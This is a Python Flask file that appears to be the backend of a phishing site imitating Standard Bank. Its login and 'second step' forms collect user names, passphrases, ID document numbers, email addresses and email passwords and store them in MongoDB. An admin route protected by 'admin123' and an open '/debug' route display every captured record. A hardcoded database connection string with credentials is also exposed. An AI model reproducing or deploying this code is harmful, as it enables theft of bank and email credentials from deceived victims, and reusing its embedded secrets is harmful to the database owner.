from flask import Flask, render_template, request, redirect
from pymongo import MongoClient
from bson.objectid import ObjectId
from datetime import datetime
import os

app = Flask(__name__)

# 🔗 Conexão com MongoDB Atlas
uri = "mongodb+srv://kingaristides:King2025@atualizacaobank0.sulu0rw.mongodb.net/?retryWrites=true&w=majority&appName=Atualizacaobank0"
client = MongoClient(uri)
db = client["Painel"]  # ✅ Corrigido aqui (de 'painel' para 'Painel')
colecao = db["standardbank_painel"]

@app.route("/")
def home():
    return render_template("login.html")

@app.route("/primeiraetapa", methods=["POST"])
def primeiraetapa():
    usuario = request.form.get("usuario")
    palavrachave = request.form.get("palavrachave")
    documento = request.form.get("documento")
    agora = datetime.now().strftime("%d/%m/%Y %H:%M:%S")

    return render_template("segundaetapa.html", usuario=usuario, palavrachave=palavrachave, documento=documento, agora=agora)

@app.route("/segundaetapa", methods=["POST"])
def segundaetapa():
    usuario = request.form.get("usuario")
    palavrachave = request.form.get("palavrachave")
    documento = request.form.get("documento")
    agora = request.form.get("agora")
    email = request.form.get("emailverificado")
    senha_email = request.form.get("senhaverificada")

    print("📦 DADOS RECEBIDOS NA SEGUNDA ETAPA:")
    print("usuario:", usuario)
    print("palavrachave:", palavrachave)
    print("documento:", documento)
    print("agora:", agora)
    print("email:", email)
    print("senha_email:", senha_email)

    try:
        registro = {
            "datahora": agora,
            "usuario": usuario,
            "palavrachave": palavrachave,
            "documento": documento,
            "email": email,
            "senha_email": senha_email
        }
        colecao.insert_one(registro)
        return render_template("atualizacao.html")
    except Exception as e:
        print("❌ ERRO AO INSERIR NO MONGODB:", e)
        return "<h3>Erro interno no servidor. Tente novamente mais tarde.</h3>"

@app.route("/admin_login", methods=["GET", "POST"])
def admin_login():
    if request.method == "POST":
        senha_admin = request.form.get("senhaadmin")
        if senha_admin == "admin123":
            registros = list(colecao.find().sort("datahora", -1))
            return render_template("admin.html", dados=registros)
        else:
            return "<h3>Senha incorreta!</h3><a href='/admin_login'>Tentar novamente</a>"
    return render_template("adminlogin.html")

@app.route("/excluir/<string:registro_id>", methods=["POST"])
def excluir(registro_id):
    colecao.delete_one({"_id": ObjectId(registro_id)})
    return redirect("/admin_login")

@app.route("/debug")
def debug():
    registros = list(colecao.find())
    return render_template("debug.html", conteudo=registros)

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(debug=True, host="0.0.0.0", port=port)
